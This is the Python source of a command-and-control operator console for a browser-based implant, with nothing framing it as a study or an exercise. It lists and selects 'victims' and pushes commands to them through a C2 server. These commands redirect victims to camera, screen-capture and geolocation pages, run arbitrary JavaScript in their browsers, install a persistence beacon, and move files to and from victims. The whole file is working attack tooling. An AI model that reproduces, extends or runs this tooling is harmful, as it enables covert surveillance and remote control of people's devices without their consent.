import cmd
import requests
import json
import os
import sqlite3
from datetime import datetime
from colorama import Fore, init, Style
import readline
import webbrowser

init(autoreset=True)

class C2CLI(cmd.Cmd):
    prompt = f"{Fore.CYAN}C2>{Style.RESET_ALL} "

    def __init__(self):  
        super().__init__()  
        self.server_url = "http://localhost:5000"  
        self.selected_victim = None  
        self.command_history = []  
        self.db = sqlite3.connect('c2.db')  
        self.db.row_factory = sqlite3.Row  

    # ========== UTILITY METHODS ==========
    def _time_ago(self, last_seen):  
        if not last_seen:  
            return "Never"  
        try:  
            last_seen_dt = datetime.fromisoformat(last_seen)  
        except ValueError:  
            try:  
                last_seen_dt = datetime.strptime(last_seen, "%Y-%m-%d %H:%M:%S")  
            except:  
                return str(last_seen)  

        diff = datetime.utcnow() - last_seen_dt  
        seconds = int(diff.total_seconds())  

        if seconds < 60:  
            return f"{seconds}s ago"  
        elif seconds < 3600:  
            return f"{seconds // 60}m ago"  
        elif seconds < 86400:  
            return f"{seconds // 3600}h ago"  
        else:  
            return f"{seconds // 86400}d ago"  

    def _execute_service(self, service):  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        link = f"{self.server_url}/{service}.html?victim={self.selected_victim}"  
        try:  
            response = requests.post(
                f"{self.server_url}/api/execute",
                json={
                    'victim_id': self.selected_victim,
                    'command': f"window.location.href='{link}'"
                }
            )
            if response.status_code == 200:
                print(f"{Fore.GREEN}Command sent to victim successfully!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Failed to send command to victim{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error sending command: {str(e)}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[➤] Direct link for victim: {link}{Style.RESET_ALL}")  
        try:  
            webbrowser.open(link)  
        except:  
            pass

    # ========== COMMAND METHODS ==========
    def do_list(self, arg):  
        """List connected victims"""  
        victims = self.db.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()  
        print(f"\n{Fore.YELLOW}{'ID':<15}{'IP':<16}{'Status':<10}{'Last Seen':<15}{Style.RESET_ALL}")  
        print(f"{'-'*60}")  
        for victim in victims:  
            status = f"{Fore.GREEN}Online" if victim['is_online'] else f"{Fore.RED}Offline"  
            last_seen_str = self._time_ago(victim['last_seen']) if victim['last_seen'] else "Never"  
            print(f"{Fore.CYAN}{victim['id']:<15}{Fore.WHITE}{(victim['ip'] or 'None'):<16}{status:<10}{Fore.MAGENTA}{last_seen_str}{Style.RESET_ALL}")  
        print("")  

    def do_select(self, victim_id):  
        """Select victim by ID"""  
        victim = self.db.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()  
        if victim:  
            self.selected_victim = victim['id']  
            print(f"{Fore.GREEN}Selected victim: {victim['id']}{Style.RESET_ALL}")  
            self.do_info('')  
        else:  
            print(f"{Fore.RED}Victim not found!{Style.RESET_ALL}")  

    def do_info(self, arg):  
        """Show victim details"""  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        victim = self.db.execute('SELECT * FROM victims WHERE id = ?', (self.selected_victim,)).fetchone()  
        if victim:  
            print(f"\n{Fore.CYAN}=== Victim Info ==={Style.RESET_ALL}")  
            print(f"ID: {victim['id']}")  
            print(f"IP: {victim['ip']}")  
            print(f"User Agent: {victim['user_agent']}")  
            print(f"First Seen: {victim['created_at']}")  
            print(f"Last Seen: {victim['last_seen']}")  
            print(f"Status: {Fore.GREEN if victim['is_online'] else Fore.RED}{'Online' if victim['is_online'] else 'Offline'}{Style.RESET_ALL}")  
            print(f"Permissions: {json.loads(victim['permissions']) if victim['permissions'] else {}}")  
        else:  
            print(f"{Fore.RED}Victim not found!{Style.RESET_ALL}")  

    def do_geo(self, arg):  
        """Get victim location"""  
        self._execute_service('geo')  

    def do_camera(self, arg):  
        """Capture victim camera"""  
        self._execute_service('camera')  

    def do_screenshare(self, arg):  
        """Capture victim screen"""  
        self._execute_service('screenshare')  

    def do_cmd(self, js_code):  
        """Execute custom JS command"""  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        if not js_code:  
            print(f"{Fore.RED}Please provide JS code{Style.RESET_ALL}")  
            return  

        response = requests.post(  
            f"{self.server_url}/api/execute",  
            json={'victim_id': self.selected_victim, 'command': js_code}  
        )  
        print(response.json())  

    def do_persist(self, arg):  
        """Establish persistence on victim"""  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        js_code = """  
        // Advanced persistence code  
        if (!window.persistInterval) {  
            window.persistInterval = setInterval(() => {  
                if (!window.c2Connected) {  
                    fetch('/').then(() => {  
                        window.c2Connected = true;  
                    }).catch(() => {  
                        window.c2Connected = false;  
                    });  
                }  
            }, 60000);  
        }  
        """  
        self.do_cmd(js_code)  

    def do_upload(self, arg):  
        """Upload file to victim"""  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        if not os.path.exists(arg):  
            print(f"{Fore.RED}File not found!{Style.RESET_ALL}")  
            return  

        with open(arg, 'rb') as f:  
            response = requests.post(  
                f"{self.server_url}/api/upload",  
                files={'file': f}  
            )  
        print(response.json())  

    def do_download(self, arg):  
        """Download file from victim"""  
        if not self.selected_victim:  
            print(f"{Fore.RED}No victim selected!{Style.RESET_ALL}")  
            return  

        response = requests.get(  
            f"{self.server_url}/api/download",  
            params={'victim_id': self.selected_victim, 'filename': arg}  
        )  

        os.makedirs('downloads', exist_ok=True)  
        with open(f"downloads/{arg}", 'wb') as f:  
            f.write(response.content)  
        print(f"{Fore.GREEN}File saved to downloads/{arg}{Style.RESET_ALL}")  

    def do_history(self, arg):  
        """Show command history"""  
        for idx, cmd in enumerate(self.command_history[-10:], 1):  
            print(f"{idx}. {cmd}")  

    def do_clear(self, arg):  
        """Clear the screen"""  
        os.system('cls' if os.name == 'nt' else 'clear')  

    def do_exit(self, arg):  
        """Exit the CLI"""  
        print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")  
        self.db.close()  
        return True  

    # ========== PRE/POST PROCESSING ==========
    def preloop(self):  
        print(f"{Fore.CYAN}Advanced C2 CLI - Type 'help' for commands{Style.RESET_ALL}")  

    def precmd(self, line):  
        self.command_history.append(line)  
        return line

if __name__ == '__main__':
    C2CLI().cmdloop()
